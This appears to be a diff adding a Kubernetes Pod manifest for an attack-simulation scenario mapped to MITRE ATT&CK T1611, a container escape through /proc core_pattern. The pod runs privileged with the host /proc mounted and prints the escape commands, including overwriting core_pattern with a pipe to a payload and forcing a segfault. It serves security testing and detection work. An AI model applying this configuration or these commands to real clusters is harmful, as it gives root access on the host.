@@ -1,0 +1,45 @@
+# KOAD-S16: /proc core_pattern Escape
+# ATT&CK: T1611 — Escape to Host
+# Attack: Write to /proc/sys/kernel/core_pattern → trigger segfault → host RCE
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: escape-proc-corepattern
+  namespace: koad
+  labels:
+    koad-scenario: S16
+    mitre-attck: T1611
+    escape-method: proc-core-pattern
+spec:
+  containers:
+    - name: attacker
+      image: ubuntu:22.04
+      command: ["sh", "-c"]
+      args:
+        - |
+          echo "=== KOAD-S16: /proc core_pattern Escape ==="
+          echo ""
+          echo "Attack steps:"
+          echo "  1. Mount host /proc:"
+          echo "     mount -t proc proc /host_proc"
+          echo ""
+          echo "  2. Overwrite core_pattern with payload:"
+          echo "     echo '|/path/to/payload.sh' > /host_proc/sys/kernel/core_pattern"
+          echo ""
+          echo "  3. Create payload script on host filesystem"
+          echo ""
+          echo "  4. Trigger segfault to execute payload:"
+          echo "     python3 -c 'import ctypes; ctypes.string_at(0)'"
+          echo ""
+          echo "  5. Payload runs as root on host"
+          sleep infinity
+      securityContext:
+        privileged: true
+      volumeMounts:
+        - name: host-proc
+          mountPath: /host_proc
+  volumes:
+    - name: host-proc
+      hostPath:
+        path: /proc
